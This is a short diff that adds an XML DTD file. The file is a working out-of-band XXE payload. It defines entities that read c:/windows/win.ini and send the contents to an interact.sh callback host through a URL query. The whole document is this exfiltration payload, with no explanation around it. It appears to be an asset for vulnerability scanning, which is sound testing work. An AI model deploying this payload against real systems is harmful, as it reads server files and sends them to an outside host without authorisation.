@@ -1,0 +1,4 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY % bravo "<!ENTITY % charlie SYSTEM
+'http://caex0082vtc00008ecc0gf8qoyeyyyyyb.interact.sh/?%data;'>">
